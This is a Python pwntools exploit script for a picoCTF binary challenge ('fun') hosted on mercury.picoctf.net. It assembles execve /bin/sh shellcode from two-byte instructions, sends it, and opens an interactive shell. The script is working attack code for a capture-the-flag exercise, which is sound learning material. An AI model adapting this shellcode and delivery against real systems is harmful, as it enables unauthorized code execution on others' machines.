#!/bin/python3
from pwn import *

p = process('./fun')
p = remote('mercury.picoctf.net', 16460)

def shortenBytes(hexInstructions):
	r = []
	for c in hexInstructions:
		temp = []
		# clear XOR for use as temp variable
		temp.append('xor eax, eax')

		# Loop through hex bytes in instruction
		for bI in range(0, len(c), 2):
			b = c[bI:bI+2]

			# Add byte to temp register
			
			# place into cl (the low byte of ecx)
			temp.append(f'mov cl, 0x{b}')
			temp.append('add eax, ecx')

			# Shift by 8 bytes
			for _ in range(8):
				# We have to shift 1 at a time because doing more
				# will lead to instructions with sizes of over 2 bytes
				temp.append('shl eax, 1')
		# delete trailing shifts
		for _ in range(8):
			del temp[-1]

		r.append("\n".join(temp))
	sp = "\npush eax\nnop\n"
	return sp.join(r) + sp + "xor eax, eax"




# From here: http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode =	f'''
				xor eax, eax
				xor ecx, ecx
				push eax
				nop
				{shortenBytes(["68732f2f", "6e69622f"])}
				mov ebx, esp
				mov ecx, eax
				mov edx, eax
				mov al, 0xb
				int 0x80
				xor eax, eax
				inc eax
				int 0x80
			'''

payload = asm(shellcode)

p.sendline(payload)

p.interactive()
